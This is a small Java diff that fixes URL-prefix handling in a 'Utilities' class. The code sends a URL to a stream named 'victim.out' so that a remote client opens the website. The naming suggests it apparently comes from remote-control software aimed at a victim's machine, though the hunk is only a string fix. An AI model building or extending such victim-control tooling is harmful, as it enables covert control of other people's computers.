@@ -199,7 +199,7 @@ public class Utilities {
 
             // do a check to see if it's a valid url address
             if(!(url.startsWith("https://www.") || url.startsWith("http://www.") || url.startsWith("www."))) {
-                url = "http://www.";
+                url = "http://www." + url;
             }
 
             println(victim.out, c1.toString() +" "+url); // this is saying to the client to open the website
